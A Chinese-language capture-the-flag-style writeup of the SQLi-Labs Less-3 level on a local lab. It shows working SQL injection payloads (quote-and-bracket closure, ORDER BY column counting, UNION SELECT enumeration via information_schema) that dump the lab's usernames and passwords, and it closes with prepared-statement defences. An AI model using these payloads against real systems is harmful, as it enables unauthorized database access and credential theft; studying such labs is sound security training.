---
title: SQLi-Labs Less-3 Writeup
date: 2026-11-02
category: Web安全
tags: [Sqli-labs, SQL注入, 报错注入]
---
## 1. 基本信息
*   **关卡名称**：Less-3 (Error based - String with twist)
*   **漏洞类型**：基于报错的字符型注入（单引号+括号闭合）
*   **测试环境**：phpStudy (Apache + MySQL)
*   **目标 URL**：`http://localhost/sqli-labs-master/Less-3/?id=1`

---

## 2. 源码分析
查看 Less-3 的源码（`Less-3/index.php`），核心 SQL 查询语句如下：

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

分析：与 Less-1 相比，这里的 id 不仅被单引号包裹，外面还多了一层括号 ()。
因此，注入 Payload 需要同时闭合单引号和右括号，即使用 ') 进行闭合，并用注释符 --+ （或 #）注释掉后面的 ) LIMIT 0,1;。

## 3. 手工注入过程

### 第一步：寻找闭合方式

在 URL 后输入单引号尝试报错：

· Payload：
  ```text
  ?id=1'
  ```
· 页面回显：
  You have an error in your SQL syntax; ... near ''1'') LIMIT 0,1' at line 1
· 结论：根据报错信息 '1'')，确认后台语句被单引号和括号包裹，闭合符为 ')。

### 第二步：判断字段数 (列数)

使用 ORDER BY 语句测试字段数：

· Payload (正常)：
  ```text
  ?id=1') ORDER BY 3 --+
  ```
· Payload (报错)：
  ```text
  ?id=1') ORDER BY 4 --+
  ```
· 结论：后台查询共 3 个字段。

### 第三步：判断回显位 (联合查询)

将 id 设为负数 -1（让前面的查询结果为空），使用 UNION SELECT 联合查询：

· Payload：
  ```text
  ?id=-1') UNION SELECT 1,2,3 --+
  ```
· 页面回显：
  · Your Login name: 2
  · Your Password: 3
· 结论：第 2 位和第 3 位是我们注入数据的回显位置。

### 第四步：获取数据库信息

利用回显位，替换为数据库内置函数。

1. 爆当前数据库名：

· Payload：
  ```text
  ?id=-1') UNION SELECT 1,2,database() --+
  ```
· 回显结果：security

2. 爆表名：

· Payload：
  ```text
  ?id=-1') UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='security' --+
  ```
· 回显结果：emails,referers,uagents,users

3. 爆 users 表的字段名：

· Payload：
  ```text
  ?id=-1') UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users' AND table_schema='security' --+
  ```
· 回显结果：id,username,password

4. 爆取账号和密码：

· Payload：
  ```text
  ?id=-1') UNION SELECT 1,2,group_concat(username,0x3a,password) FROM users --+
  ```
  (注：0x3a 是冒号的十六进制，用于分隔用户名和密码)
· 回显结果：Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,...

## 4. 总结与防御

· 注入点：GET 请求参数 id。
· 闭合方式：')
· 防御建议：在代码中不要直接拼接 SQL 语句，应使用 PDO 预处理（Prepared Statements），或者使用 mysqli_real_escape_string() 等函数对输入进行严格的过滤和转义。
